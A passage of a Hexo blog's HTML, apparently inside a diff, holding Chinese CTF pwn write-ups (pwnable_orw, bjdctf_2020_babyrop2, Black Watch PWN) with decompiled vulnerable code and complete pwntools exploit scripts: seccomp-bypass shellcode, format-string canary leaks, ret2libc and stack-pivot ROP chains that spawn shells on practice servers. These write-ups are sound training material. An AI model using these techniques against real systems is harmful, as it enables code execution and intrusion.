class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27972</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">int_addr = <span class="number">0x080493e1</span></span><br><span class="line">pop_eax = <span class="number">0x080bae06</span></span><br><span class="line">read_addr= <span class="number">0x0806CD50</span></span><br><span class="line">binsh_addr = <span class="number">0x080EB584</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806e850</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(binsh_addr) + p32(<span class="number">0x8</span>)</span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(binsh_addr) + p32(int_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+<p>这道题用libc应该也是可以做的，有puts函数，通过暴露puts函数的地址，得到libc版本再getshell。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pwnable_orw/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pwnable_orw/" class="post-title-link" itemprop="url">pwnable_orw</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-10-06 10:28:39" itemprop="dateCreated datePublished" datetime="2021-10-06T10:28:39+08:00">2021-10-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-07-19 10:13:57" itemprop="dateModified" datetime="2022-07-19T10:13:57+08:00">2022-07-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a>pwnable_orw</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/109564279">https://blog.csdn.net/mcmuyanga/article/details/109564279</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44768749/article/details/108256099">https://blog.csdn.net/qq_44768749/article/details/108256099</a></p>
+<p><img src="/pwnable_orw/1.jpg"></p>
+<p>开启了栈保护，但可以执行shellcode，查看字符串没有发现&#x2F;bin&#x2F;sh</p>
+<p>关键代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  orw_seccomp();           <span class="comment">//类似沙盒机制，可以用seccomp-tools工具来检查什么函数可用</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give my your shellcode:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0xC8</span>u);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))shellcode)();    <span class="comment">//我们写入汇编代码就可以执行，例如shellcode，但是有沙盒</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">orw_seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [esp+4h] [ebp-84h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">96</span>]; <span class="comment">// [esp+Ch] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  qmemcpy(v3, &amp;unk_8048640, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  v1 = <span class="number">12</span>;</span><br><span class="line">  v2 = v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/pwnable_orw/2.jpg"></p>
+<p>可见，有open、read、write函数可用，可以尝试用来读取flag文件并打印出来</p>
+<p>构造padload1</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28528</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>构造payload2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28528</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;shellcode:&#x27;</span>, shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/bjdctf_2020_babyrop2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/bjdctf_2020_babyrop2/" class="post-title-link" itemprop="url">bjdctf_2020_babyrop2</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-10-05 21:29:52" itemprop="dateCreated datePublished" datetime="2021-10-05T21:29:52+08:00">2021-10-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-07-19 09:20:30" itemprop="dateModified" datetime="2022-07-19T09:20:30+08:00">2022-07-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h2><p><img src="/bjdctf_2020_babyrop2/1.jpg"></p>
+<p>可见，这里开启了栈执行保护和栈溢出保护，但不是菜单题，不考虑是堆，展示重要代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  gift();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;ll give u some gift to help u!&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%6s&quot;</span>, format);                <span class="comment">// 有格式化字符串漏洞，可以打印栈上的内容，例如cancary的值，而且它们的值是一样的，在子线程内？</span></span><br><span class="line">  <span class="built_in">printf</span>(format);                               <span class="comment">// 控制输入内容%7$p即可打印栈内容</span></span><br><span class="line">  <span class="built_in">puts</span>(byte_400A05);</span><br><span class="line">  fflush(<span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);                        <span class="comment">// 栈溢出，利用cancary避免栈保护，然后正常的ret2libc</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>根据函数分析，可以构造payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,27146)</span></span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line">payload = <span class="string">&#x27;%7$p&#x27;</span>    <span class="comment">#打印栈上的cancary</span></span><br><span class="line">r.sendline(payload)    </span><br><span class="line">r.recvuntil(<span class="string">&#x27;0x&#x27;</span>)   <span class="comment">#接收cancary，cancary是通用的，因此gift上的cancary和vuln函数上的cancary的值是一样的</span></span><br><span class="line">cancry = <span class="built_in">int</span>(r.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0400993</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr = <span class="number">0x0400887</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">8</span>)+p64(cancry)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base_addr = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr=base_addr + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">shell_addr = base_addr + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">8</span>)+p64(cancry)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(shell_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/BlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98PWN/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/BlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98PWN/" class="post-title-link" itemprop="url">BlackWatch入群题-PWN</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-10-02 11:22:10" itemprop="dateCreated datePublished" datetime="2021-10-02T11:22:10+08:00">2021-10-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-07-19 09:23:36" itemprop="dateModified" datetime="2022-07-19T09:23:36+08:00">2022-07-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p><img src="/BlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98PWN/1.jpg"></p>
+<p>checksec查看，得到32位，并且不可执行shellcode，使用ida查看代码，代码如下，查看字符串，没有发现’&#x2F;bin&#x2F;sh’</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vul_function();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GoodBye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>u);      <span class="comment">//s是bss段的一段内存，无法溢出到</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);    <span class="comment">//只能溢出0x8的空间，也就是只能覆盖到ebp和ret，明显的栈迁移</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该题的解题思路就是栈迁移+libc，我们可以把payload写在bss段上，然后覆盖ebp和ret，把ebp覆盖成bss地址-4，把ret覆盖成leave ret。</p>
+<p>那么，leave就会mov esp ebp   pop ebp，然后到ret。这样把bss段的第一个地址当成ret地址了，可以执行函数。注意这种不是shellcode不要求有执行栈的权限。</p>
+<p><img src="/BlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98PWN/2.jpg"></p>
+<p>完整payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25396</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">func_addr = <span class="number">0x0804849B</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">leave_ret_addr = <span class="number">0x08048408</span> <span class="comment"># ROPgadget --binary rop --only &quot;leave|ret&quot;</span></span><br><span class="line">bss_addr = <span class="number">0x0804A300</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在read的bss端读入rop链</span></span><br><span class="line"></span><br><span class="line">payload = p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(main_addr) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;name?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈迁移原理：ebp覆盖成目标内存地址，leave;ret=&gt;mov esp ebp;pop ebp;pop eip;call eip;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># esp指向bss段，这就是栈迁移</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x18</span> * <span class="string">&#x27;a&#x27;</span> + p32(bss_addr-<span class="number">4</span>) + p32(leave_ret_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;say?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr: &#x27;</span>+<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一定要用LibcSearcher</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system[%s],binsh[%s]&#x27;</span> % (<span class="built_in">hex</span>(system_addr), <span class="built_in">hex</span>(binsh_addr)))</span><br><span class="line"></span><br><span class="line">payload = p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;name?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x18</span> * <span class="string">&#x27;a&#x27;</span> + p32(bss_addr-<span class="number">4</span>) + p32(leave_ret_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;say?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/picoctf_2018_rop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
